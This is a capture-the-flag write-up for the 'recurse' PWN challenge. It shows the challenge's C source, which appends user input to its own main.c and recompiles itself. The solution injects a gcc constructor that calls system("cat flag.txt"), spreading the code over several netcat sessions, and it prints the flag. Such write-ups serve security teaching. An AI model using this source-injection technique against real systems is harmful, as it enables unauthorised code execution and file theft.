# recurse

Category: PWN

Points: 178

Solves: 65

>I hate loops.

### Solution

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int get(char* buf, int n) {
    fflush(stdout);
    if (fgets(buf, n, stdin) == NULL) {
        puts("Error");
        exit(1);
    }
    int end = strcspn(buf, "\n");
    if (buf[end] == '\0') {
        puts("Too long");
        exit(1);
    }
    buf[end] = '\0';
    return end;
}

int main(void) {
    fputs("Filename? ", stdout);
    char fname[10];
    int fn = get(fname, sizeof(fname));
    for (int i = 0; i < fn; ++i) {
        char c = fname[i];
        if (('a' <= c && c <= 'z') || c == '.') {
            continue;
        }
        puts("Only a-z and .");
        return 1;
    }
    if (strstr(fname, "flag.txt") != NULL) {
        printf("Nice try!");
        return 1;
    }
    FILE* file = fopen(fname, "a+b");

    fputs("Read (R) or Write (W)? ", stdout);
    char option[3];
    get(option, sizeof(option));

    switch (option[0]) {
        case 'R': {
            char contents[25];
            int n = fread(contents, 1, sizeof(contents), file);
            fputs("Contents: ", stdout);
            fwrite(contents, 1, n, stdout);
            puts("");
            break;
        }
        case 'W': {
            fputs("Contents? ", stdout);
            char contents[25];
            int n = get(contents, sizeof(contents));
            fwrite(contents, 1, n, file);
            break;
        }
        default: {
            puts("Invalid");
            return 1;
        }
    }

    fclose(file);
    fflush(stdout);

    int ret = system("gcc main.c -o main");
    if (!WIFEXITED(ret) || WEXITSTATUS(ret)) {
        puts("Compilation failed");
        return 1;
    }
    execl("main", "main", NULL);
}
```

We are given C code that takes in a filename as an input and we are allowed to read the first 25 bytes or write 25 bytes to the end of the file. The only restriction we seem to have is that we can't just directly read `flag.txt`. After we write to the file, the program attempts to recompile itself. If it fails, we get disconnected, and if it succeeds, the program will recursively call itself.

We can quickly see that there is a vulnerability where we can write arbitrary code into `main.c`, but it doesn't seem to be useful just yet as anything written after the main function won't be run in time. After a bit of research we can find ```__attribute__((constructor))``` in gcc, which will make a function run on startup. Unfortunately, this isn't less than `25` chars long. After a bit of fidling with macros and other ways to short the code, I realized that it doesn't mater if we compile error.

There is the `main.c` file and `main` binary on the server. After we write data to `main.c` it will stay there permenantly. If we get a compile error, we essentially have updated `main.c` but not `main`. So when we connect to the server again we can keep running the working `main` while updating `main.c`. Finally, once we have a compiling `main.c`, we have injected our code: ```__attribute__((constructor)) void a(){system("cat flag.txt");}``` and will get the flag:

```bash
$ nc 34.31.154.223 50359
Filename? main.c       
Read (R) or Write (W)? W
Contents? __attribute__
Compilation failed
$ nc 34.31.154.223 50359
Filename? main.c
Read (R) or Write (W)? W
Contents? ((constructor)) 
Compilation failed
$ nc 34.31.154.223 50359
Filename? main.c
Read (R) or Write (W)? W
Contents? void a(){system
Compilation failed
$ nc 34.31.154.223 50359
Filename? main.c
Read (R) or Write (W)? W
Contents? ("cat flag.txt");}
LITCTF{4_pr0gr4m_7h4t_m0d1f13s_1t5elf?_b34u71ful!_a1cd446b}
Filename? ^C
```

### Flag

```LITCTF{4_pr0gr4m_7h4t_m0d1f13s_1t5elf?_b34u71ful!_a1cd446b}```


